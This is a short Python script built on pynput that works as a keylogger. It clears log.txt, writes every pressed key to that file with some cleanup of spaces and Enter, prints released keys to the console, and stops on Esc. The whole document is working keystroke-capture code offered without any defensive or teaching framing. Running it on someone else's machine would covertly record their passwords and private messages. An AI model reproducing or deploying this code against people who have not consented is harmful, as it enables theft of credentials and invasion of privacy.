from pynput import keyboard

# delete all contents of log.txt first
open('log.txt', 'w').close()

# to log keystrokes
def log_keystroke(key):
    key=str(key).replace("'",'')

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r' or key == 'Key.esc':
        key = ''
    if key == 'Key.enter':
        key = '\n'
    
    with open("log.txt", 'a') as f:
        f.write(key)

# to stop listener
def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=log_keystroke, on_release = on_release) as l:
    l.join()